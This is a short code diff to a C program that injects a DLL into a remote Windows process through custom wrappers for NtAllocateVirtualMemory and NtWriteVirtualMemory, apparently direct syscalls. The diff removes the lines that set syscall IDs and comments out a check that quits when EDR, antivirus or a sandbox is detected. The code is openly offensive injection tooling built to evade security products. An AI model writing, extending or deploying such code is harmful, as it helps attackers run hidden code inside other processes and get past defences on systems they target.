@@ -21,7 +21,6 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char *dllN)
         return;
     }
 
-    SetSyid(GetSyid("NtAllocateVirtualMemory"));
     status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0)
     {
@@ -35,7 +34,6 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char *dllN)
         return;
     }
 
-    SetSyid(GetSyid("NtWriteVirtualMemory"));
     // Write DLL Path to Remote Process
     status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
     if (status != 0)
@@ -61,10 +59,10 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char *dllN)
 int main(int argc, char *argv[])
 {
     // Check For EDR/AV/Sandbox env
-    if (PerfomChecksEnv())
-    {
-        return 0;
-    }
+    // if (PerfomChecksEnv())
+    // {
+    //     return 0;
+    // }
 
     // If no DLL given, abort.
     if (argc != 2)
